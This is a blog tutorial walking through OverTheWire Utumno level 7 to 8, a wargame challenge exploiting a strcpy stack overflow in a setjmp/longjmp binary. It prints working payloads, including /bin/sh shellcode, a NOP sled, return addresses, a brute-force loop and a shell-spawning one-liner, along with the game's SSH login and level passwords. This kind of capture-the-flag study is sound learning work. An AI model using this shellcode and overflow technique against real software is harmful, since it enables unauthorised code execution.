---
date: 2023-09-15 00:00:00 +0700
layout: post-with-comments
title: "OverTheWire Utumno Level 7 → 8 tutorial!!"
permalink: /posts/overTheWire-Utumno-Level-7-to-8/
tags: [overthewire, utumno, pwn, setjmp-longjmp, strcpy, jmpbuf, buffer-overflow, shellcode, binary-exploitation, linux, beginner]
description: "A step by step tutorial for OverTheWire Utumno Level 7 → 8!!"
---

<!-- Scoped styles -->
<style>
  .bandit-nav{display:flex;align-items:center;gap:.75rem;margin:.5rem 0 1.25rem;border-top:1px solid var(--border-color,#3a3a3a);padding-top:.75rem}
  .bandit-nav .nav-left,.bandit-nav .nav-center,.bandit-nav .nav-right{flex:1}
  .bandit-nav .nav-left{text-align:left}
  .bandit-nav .nav-center{text-align:center}
  .bandit-nav .nav-right{text-align:right}
  .bandit-nav a{display:inline-block;padding:.45rem .8rem;border:1px solid var(--border-color,#3a3a3a);border-radius:.6rem;text-decoration:none;line-height:1}
  .bandit-nav a:hover{transform:translateY(-1px)}
  .bandit-nav .disabled{opacity:.55}
  :root[data-theme='light'] .bandit-nav a{border-color:rgba(0,0,0,.15)}
</style>

<nav class="bandit-nav" aria-label="Utumno level navigation">
  <div class="nav-left">
    <a href="{{ '/posts/overTheWire-Utumno-Level-6-to-7/' | relative_url }}">← Previous: Level 6 → 7</a>
  </div>
  <div class="nav-center">
    <a href="https://overthewire.org/wargames/utumno/utumno8.html" target="_blank" rel="noopener">Official (Level 8) ↗</a>
  </div>
  <div class="nav-right">
    <span class="disabled">Next: —</span>
  </div>
</nav>

## Login

Use the password from **Level 6 → 7**:

```bash
ssh utumno7@utumno.labs.overthewire.org -p 2227
# password: totiquegae
````

Then move to the game folder:

```bash
cd /utumno
```

---

## Task

Binary: **`/utumno/utumno7`**

* `main` prints a taunt, then calls `vuln(argv[1])`.
* `vuln`:

  1. Reserves **0x120 bytes** on the stack.
  2. Saves a **`jmp_buf`** pointer (to `[ebp-0xa0]`) in a **global**.
  3. Calls **`_setjmp(jmpbuf)`**.
  4. If the return is **0**, it does `strcpy(local_buf, argv[1])` (overflow!), then calls `jmp(0x17)`.
  5. `jmp` does **`longjmp(saved_jmpbuf, arg)`**, bouncing back.

**Goal:** Use the `strcpy` to overflow the stack and **control EIP**, then **return into a NOP sled + shellcode** placed in our argument string. The `setjmp/longjmp` dance makes offsets a bit quirky, but the core is a classic stack smash.

---

## Source Code (Disassembly Excerpt)

`main`:

```asm
cmp  [ebp+0x8], 0x1        ; need at least 1 arg
jg   ok
push 1; call exit

ok:
puts("lol ulrich && fuck hector")
push argv[1]
call vuln
```

`vuln`:

```asm
sub   esp, 0x120
mov   [ebp-0x4], 0
lea   eax, [ebp-0xa0]
mov   ds:0x8049868, eax      ; save jmpbuf pointer globally
push  eax
call  _setjmp                 ; save env

mov   [ebp-0x4], eax
cmp   [ebp-0x4], 0
jne   done                    ; on longjmp return, skip strcpy/jmp

push  [ebp+0x8]               ; arg
lea   eax, [ebp-0x120]
push  eax
call  strcpy                  ; VULN: copies our input into local buf

push  0x17
call  jmp                     ; jmp -> longjmp(saved_env, 0x17)

done:
leave
ret
```

---

## Exploitation Steps

### 1) Find the overflow point / EIP control

A long ‘A’ string crashes with EIP=`0x41414141` around **140 bytes**:

```bash
./utumno7 $(python -c 'print "A"*140')
# ... SIGSEGV at 0x41414141
```

With **144 bytes** (`+ "BBBB"`), the crash happens while handling the setjmp result—offsets shift because of `longjmp`:

```gdb
run $(python -c 'print "A"*140 + "BBBB"')
# SIGSEGV while storing setjmp return; still good signal that we're close
```

### 2) Point RET into our own buffer

Use a stack address that lands **inside our input buffer**. For example, supply:

```
"AAAA" + "BBBB" + NOP*132 + <RET>
```

Where **`<RET>`** is a little-endian pointer into the NOP sled area of that same buffer. You’ll see EIP become `0x42424242` when using `BBBB` as a probe, confirming control:

```gdb
run $(python -c "print 'AAAA' + 'BBBB' + '\x90'*132 + '\xdd\xd7\xff\xff'")
# EIP = 0x42424242 → control confirmed
```

### 3) Drop shellcode and adjust the two addresses

Place standard `/bin//sh` shellcode at the end of the buffer (after a NOP sled), and use two helpful pointers:

* A **helper pointer** shortly after the prologue (e.g., `\x11\xd8\xff\xff`) to keep control flow aligned.
* A **final RET** that jumps into the sled (e.g., near `0xffffd7dd`).

Example working payload from the run:

```bash
./utumno7 $(python -c "print 'AAAA' \
  + '\x11\xd8\xff\xff' \
  + '\x90'*111 \
  + '\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80' \
  + '\xdd\xd7\xff\xff'")
# lol ulrich && fuck hector
# process ... is executing new program: /bin/dash
$
```

### 4) Brute-force the last byte (if needed)

Due to stack jitter from `setjmp/longjmp`, the exact sled address may vary outside `gdb`. A tiny bash loop to brute-force the **last byte** of your final RET often seals the deal:

```bash
i=0
while [ $i -lt 255 ]; do
  x=$(printf "%02x" $i)
  ./utumno7 $(python - <<PY
buf = b"AAAA" \
    + b"\x11\xd8\xff\xff" \
    + b"\x90"*111 \
    + (b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80") \
    + bytes.fromhex(f"{x} d7 ff ff")
print(buf.decode("latin1"))
PY
)
  i=$((i+1))
done
```

Eventually you’ll pop a shell:

```bash
$ whoami
utumno8
$ cat /etc/utumno_pass/utumno8
jaeyeetiav
```

---

## Password

From my run:

```
jaeyeetiav
```

---

## Quick One-liner

```bash
./utumno7 $(python - <<'PY'
import sys
sled = b"\x90"*111
sc = b"\x31\xc9\xf7\xe1\xb0\x0b\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
payload = b"AAAA" + b"\x11\xd8\xff\xff" + sled + sc + b"\xdd\xd7\xff\xff"
sys.stdout.write(payload.decode("latin1"))
PY
) && whoami && cat /etc/utumno_pass/utumno8
```

---

## Troubleshooting

* **EIP not `0x41414141` near 140?** Recheck the length you feed into `strcpy`. Aim around **140–148** and verify in `gdb`.
* **Crashing inside libc / setjmp?** That’s expected with `longjmp`. Keep nudging the two addresses (helper + final RET) and re-pick a sled address with `x/512x $esp-500`.
* **Shellcode not reached?** Grow the **NOP sled** and adjust the final RET by ±`0x10`–`0x40`. Make sure addresses are **little-endian**.
* **Outside `gdb` different?** ASLR and environment changes shift stack—use the **last-byte brute force** loop.

---

**Congrats 🎉** You wrangled a `setjmp/longjmp`-flavored stack overflow and returned into your own buffer’s NOP sled—clean finish to Utumno!

---

## Thanks for reading!

Until next time — **Otsumachi!!** 💖☄️✨

![Cinema]({{ '/assets/images/advice/cinema.gif' | relative_url }})
